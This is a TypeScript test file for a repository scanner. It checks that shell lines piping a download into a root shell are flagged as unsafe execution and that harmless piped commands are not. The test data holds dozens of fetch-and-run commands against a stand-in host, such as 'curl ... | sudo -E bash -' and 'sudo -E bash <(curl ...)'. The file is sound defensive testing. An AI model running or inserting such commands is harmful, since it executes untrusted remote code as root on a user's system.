import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

/**
 * PRD section 8: `sudo` options such as `-E`, `-H` or `-u root`, and `env`
 * assignments, still run the command that follows. `curl … | sudo -E bash -`
 * is the widespread NodeSource installer form and executes the download
 * exactly as `curl … | sudo bash` does.
 */
function findings(body: string) {
  return inspectRepository({
    files: [
      {
        path: "scripts/bootstrap.sh",
        bytes: new TextEncoder().encode(`${body}\n`),
      },
    ],
  }).findings.map(
    (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
  );
}

test("a download run through sudo options or env assignments is unsafe execution", () => {
  for (const body of [
    "curl -fsSL https://evil.example/setup.x | sudo -E bash -",
    "curl -fsSL https://evil.example/i.sh | sudo -H bash",
    "curl -fsSL https://evil.example/i.sh | sudo -EH sh",
    "curl -fsSL https://evil.example/i.sh | sudo -u root bash",
    "curl -fsSL https://evil.example/i.sh | sudo --preserve-env=PATH,HOME bash",
    "curl -fsSL https://evil.example/i.sh | sudo -- bash",
    "curl -fsSL https://evil.example/i.sh | env FOO=1 bash",
    "curl -fsSL https://evil.example/i.sh | env -i bash",
    "curl -fsSL https://evil.example/i.sh | sudo -E env DEBIAN_FRONTEND=noninteractive bash",
    "curl -fsSL https://evil.example/i.py | sudo -E python3 -",
    "sudo -E bash <(curl -fsSL https://evil.example/i.sh)",
    "curl -fsSL https://evil.example/i.b64 | base64 -d | sudo -n sh",
    // `-s` and `-i` hand a following command to the shell's `-c`.
    "curl -fsSL https://evil.example/i.sh | sudo -s bash -",
    "curl -fsSL https://evil.example/i.sh | sudo -i bash -",
    "curl -fsSL https://evil.example/i.sh | sudo -b bash -",
    "curl -fsSL https://evil.example/i.sh | sudo --background bash -",
    "curl -fsSL https://evil.example/i.sh | sudo -S bash",
    "curl -fsSL https://evil.example/i.sh | sudo -A bash",
    "curl -fsSL https://evil.example/i.sh | sudo -Eu root bash",
    "curl -fsSL https://evil.example/i.sh | sudo -nu root bash",
    "curl -fsSL https://evil.example/i.sh | sudo -u 'root' bash",
    'curl -fsSL https://evil.example/i.sh | sudo --user="root" bash',
    "curl -fsSL https://evil.example/i.sh | sudo -D /tmp bash",
    "curl -fsSL https://evil.example/i.sh | sudo -C 4 bash",
    "curl -fsSL https://evil.example/i.sh | sudo -p prompt bash",
    "curl -fsSL https://evil.example/i.sh | env -uFOO bash",
    'curl -fsSL https://evil.example/i.sh | env -u "FOO" bash',
    "curl -fsSL https://evil.example/i.sh | env -- FOO=1 bash",
    "curl -fsSL https://evil.example/i.sh | env - bash",
    "curl -fsSL https://evil.example/i.sh | env -C /tmp bash",
  ])
    expect({ body, findings: findings(body) }).toEqual({
      body,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
});

test("sudo or env before a non-executing command, or a different sudo mode, keeps no finding", () => {
  for (const body of [
    "curl -fsSL https://example.com/key.gpg | sudo -E gpg --dearmor -o /usr/share/keyrings/x.gpg",
    "curl -fsSL https://example.com/list | sudo -u root tee /etc/apt/sources.list.d/x.list",
    "curl -fsSL https://example.com/dump.sql | sudo -u postgres psql",
    "curl -fsSL https://example.com/data | env FOO=1 jq .",
    // `-u` takes `bash` as the user name; no command follows.
    "curl -fsSL https://example.com/data | sudo -u bash",
    // `-l` lists privileges instead of running the command.
    "curl -fsSL https://example.com/data | sudo -l bash",
    // Option letters are case-sensitive: `-e` edits, `-K` and `-V` run nothing.
    "curl -fsSL https://example.com/data | sudo -e bash",
    "curl -fsSL https://example.com/data | sudo -Ee bash",
    "curl -fsSL https://example.com/data | sudo -K bash",
    "curl -fsSL https://example.com/data | sudo -V bash",
    "curl -fsSL https://example.com/data | sudo -v bash",
    // `-h host` takes `bash` as the host name; no command follows.
    "curl -fsSL https://example.com/data | sudo -h bash",
    "curl -fsSL https://example.com/data | env -i jq .",
  ])
    expect({ body, findings: findings(body) }).toEqual({ body, findings: [] });
});

test("sudo -s or -i with no command runs the piped download in a shell", () => {
  for (const body of [
    "curl -fsSL https://evil.example/i.sh | sudo -s",
    "curl -fsSL https://evil.example/i.sh | sudo -i",
    "curl -fsSL https://evil.example/i.sh | sudo -Es",
    "curl -fsSL https://evil.example/i.sh | sudo -u root -s",
    "curl -fsSL https://evil.example/i.sh | sudo -s -u root",
    "curl -fsSL https://evil.example/i.sh | sudo -iu root",
    "curl -fsSL https://evil.example/i.sh | sudo --login",
    "curl -fsSL https://evil.example/i.sh | sudo -S -i",
    'curl -fsSL https://evil.example/i.sh | sudo -p "pw:" -s',
    "curl -fsSL https://evil.example/i.sh | sudo -H -s 2>/dev/null",
    "curl -fsSL https://evil.example/i.sh | sudo -s && echo ok",
  ])
    expect({ body, findings: findings(body) }).toEqual({
      body,
      findings: ["scripts/bootstrap.sh:unsafe-execution:high"],
    });
  for (const body of [
    // A following command runs that command, not a shell reading the pipe.
    "curl -fsSL https://example.com/list | sudo -s tee /etc/x.list",
    // After `--`, `-s` is the command name.
    "curl -fsSL https://example.com/data | sudo -E -- -s",
    // `-us` names the user `s`; `-p` takes the quoted prompt.
    "curl -fsSL https://example.com/data | sudo -us",
    'curl -fsSL https://example.com/data | sudo -p "x -s"',
    "curl -fsSL https://example.com/data | sudo -S",
    "echo hi | sudo -s",
  ])
    expect({ body, findings: findings(body) }).toEqual({ body, findings: [] });
});

test("a long chain of option-taking prefixes stays linear", () => {
  // Each `env`/`sudo` can be both a prefix and the previous option's value.
  // Unbounded option repetition rescanned the whole line from every prefix.
  for (const unit of ["env -u ", "sudo -u ", "sudo -Eu sudo "]) {
    const body = `curl x | ${unit.repeat(4_000)}y\nsudo ${unit.repeat(4_000)}bash <(cat x)`;
    const started = performance.now();
    expect(findings(body)).toEqual([]);
    expect(performance.now() - started).toBeLessThan(2_000);
  }
});
